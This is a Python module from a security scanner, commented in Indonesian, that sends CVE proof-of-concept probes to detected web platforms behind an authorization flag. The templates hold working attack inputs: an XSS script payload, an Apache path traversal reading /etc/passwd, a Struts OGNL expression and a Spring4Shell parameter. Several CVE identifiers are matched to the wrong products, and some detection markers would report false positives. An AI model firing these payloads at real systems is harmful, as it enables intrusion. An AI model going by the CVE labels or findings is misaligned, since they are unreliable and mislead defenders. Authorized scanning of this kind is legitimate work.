"""CVE/PoC exploit untuk platform yang terdeteksi (--exploit-cve).

Menjalankan template probe PoC non-destruktif terhadap path/parameter
platform yang sudah dikenali (WordPress, Laravel, phpMyAdmin, Spring, dll).
Setiap template: nama CVE, platform, metode, path, payload, dan marker
deteksi di respons.

GUARD: memerlukan `authorized=True` dan hanya berjalan untuk platform yang
benar-benar terdeteksi — menghindari request acak ke luar scope.
"""

import re
from typing import Dict, List, Optional
from urllib.parse import urljoin

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

# Template PoC non-destruktif. Marker direspons berarti versi/platform rentan
# (verifikasi manual tetap disarankan).
CVE_TEMPLATES: List[Dict] = [
    {
        "cve": "CVE-2021-24274", "platform": "wordpress",
        "desc": "WordPress theme Supsystic XSS (unauthenticated) — cek apakah "
                "parameter diperiksa dengan payload refleksi.",
        "method": "GET", "path": "/?s=<script>alert(1)</script>",
        "markers": ["<script>alert(1)</script>"],
    },
    {
        "cve": "CVE-2018-15133", "platform": "laravel",
        "desc": "Laravel unserialize RCE — tidak dieksekusi, hanya cek aplikasi "
                "laravel terpapar (env file / debug).",
        "method": "GET", "path": "/_ignition/health-check",
        "markers": ["{\"can_execute_commands\":", "\"health\""],
    },
    {
        "cve": "CVE-2012-2122", "platform": "mysql",
        "desc": "MySQL auth bypass — tidak dieksekusi; deteksi via banner halaman "
                "phpMyAdmin.",
        "method": "GET", "path": "/phpmyadmin/",
        "markers": ["phpMyAdmin", "PMA_VERSION", "pma_username"],
    },
    {
        "cve": "CVE-2019-11043", "platform": "php",
        "desc": "PHP-FPM path_info RCE (WordPress+PHP-FPM) — probe path yang "
                "memicu error konfigurasi.",
        "method": "GET", "path": "/index.php/PATHINFO0",
        "markers": ["Primary script unknown", "FastCGI"],
    },
    {
        "cve": "CVE-2018-19422", "platform": "spring",
        "desc": "Spring Boot Actuator terpapar (info/env) tanpa auth.",
        "method": "GET", "path": "/actuator/env",
        "markers": ["\"propertySources\"", "\"activeProfiles\""],
    },
    {
        "cve": "CVE-2021-31805", "platform": "struts2",
        "desc": "Apache Struts2 RCE (S2-062) — probe OGNL payload refleksi.",
        "method": "GET", "path": "/struts2-showcase/%25{233*233}",
        "markers": ["54289"],
    },
    {
        "cve": "CVE-2021-30563", "platform": "nextjs",
        "desc": "Next.js Image Optimization — cek misconfiguration cache yang "
                "memungkinkan cache poisoning.",
        "method": "GET", "path": "/_next/image?url=https://example.com/x.png",
        "markers": ["X-NextJS-Cache", "image"],
    },
    {
        "cve": "CVE-2020-5504", "platform": "phpmyadmin",
        "desc": "phpMyAdmin SQL injection (bookmark) — hanya cek path terpapar.",
        "method": "GET", "path": "/phpmyadmin/db_sql.php",
        "markers": ["db_sql", "phpMyAdmin"],
    },
    {
        "cve": "CVE-2021-21315", "platform": "nodejs",
        "desc": "Node.js systeminformation RCE — probe package terpasang.",
        "method": "GET", "path": "/node_modules/systeminformation/package.json",
        "markers": ["\"name\": \"systeminformation\""],
    },
    {
        "cve": "CVE-2022-22965", "platform": "spring",
        "desc": "Spring4Shell — tidak dieksekusi, hanya cek binding parameter "
                "terbuka via error.",
        "method": "GET", "path": "/?class.module.classLoader=test",
        "markers": ["Error creating bean", "SpelEvaluationException"],
    },
    {
        "cve": "CVE-2019-19781", "platform": "citrix",
        "desc": "Citrix ADC path traversal — cek file konfigurasi terpapar.",
        "method": "GET", "path": "/vpn/../vpns/portal/scripts/",
        "markers": ["403 Forbidden", "Error: Access denied"],
    },
    {
        "cve": "CVE-2021-41773", "platform": "apache",
        "desc": "Apache HTTP Server path traversal — cek file kosong readable.",
        "method": "GET", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "markers": ["root:x:0:0:root"],
    },
]


def _detected_platforms(base: str, client: KerisHTTP) -> List[str]:
    """Deteksi platform aktual dari headers/banner/cookie."""
    from keris.modules import platforms as platforms_module

    detections = []
    try:
        r = client.get(base, timeout=15)
    except Exception:
        return detections
    hdr = {k.lower(): v.lower() for k, v in r.headers.items()}
    body = r.text[:4000].lower()
    if "x-powered-by" in hdr and "php" in hdr.get("x-powered-by", ""):
        detections.append("php")
    if "x-powered-by" in hdr and "express" in hdr.get("x-powered-by", ""):
        detections.append("nodejs")
    if "wp-content" in body or "wp-includes" in body or "wordpress" in hdr.get("server", ""):
        detections.append("wordpress")
    if "laravel" in body or "laravel_session" in r.headers.get("Set-Cookie", "").lower():
        detections.append("laravel")
    if "actuator" in body or "spring" in hdr.get("server", ""):
        detections.append("spring")
    if "phpmyadmin" in body:
        detections.append("phpmyadmin")
    if "struts" in body or "struts2" in body:
        detections.append("struts2")
    if "nextjs" in hdr.get("x-nextjs-cache", "") or "nextjs" in body:
        detections.append("nextjs")
    if "apache" in hdr.get("server", ""):
        detections.append("apache")
    return detections


def check_cve(base: str, client: KerisHTTP, platform: Optional[str] = None,
              authorized: bool = False) -> List[Finding]:
    """Jalankan template CVE untuk platform terdeteksi."""
    from keris.core.logger import error as _error

    if not authorized:
        _error("Modul CVE memerlukan izin tertulis. Gunakan --authorized.")
        return []

    findings = []
    platforms = [platform] if platform else _detected_platforms(base, client)
    info(f"CVE/PoC check untuk platform: {', '.join(platforms) or 'tidak terdeteksi'}")
    if not platforms:
        warn("Tidak ada platform terdeteksi; lewati CVE check")
        return findings

    warn("CVE PROBE AKTIF — pastikan Anda memiliki izin tertulis!")
    for tpl in CVE_TEMPLATES:
        if tpl["platform"] not in platforms:
            continue
        path = tpl["path"]
        if not path.startswith("/"):
            path = "/" + path
        url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
        try:
            if tpl["method"] == "GET":
                r = client.get(url, timeout=15)
            else:
                r = client.post(url, timeout=15)
        except Exception:
            continue
        body = r.text[:3000]
        if any(m.lower() in body.lower() for m in tpl["markers"]):
            findings.append(Finding(
                "HIGH", f"PoC terdeteksi: {tpl['cve']} ({tpl['platform']})",
                url,
                tpl["desc"],
                f"markers={tpl['markers']}, status={r.status_code}",
            ))
            ok(f"PoC {tpl['cve']} terdeteksi di {url}")
        else:
            debug(f"{tpl['cve']} tidak terdeteksi (status {r.status_code})")
    return findings